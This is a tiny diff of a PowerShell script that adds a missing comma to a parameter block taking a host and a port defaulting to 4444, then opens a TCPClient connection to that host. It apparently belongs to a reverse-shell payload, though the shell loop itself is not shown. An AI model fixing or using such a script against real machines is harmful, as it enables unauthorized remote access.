@@ -1,5 +1,5 @@
 param(
-    [Parameter(Mandatory=$true)][string]$host
+    [Parameter(Mandatory=$true)][string]$host,
     [string]$port = "4444"
 )
 $client = New-Object System.Net.Sockets.TCPClient($host, $port)
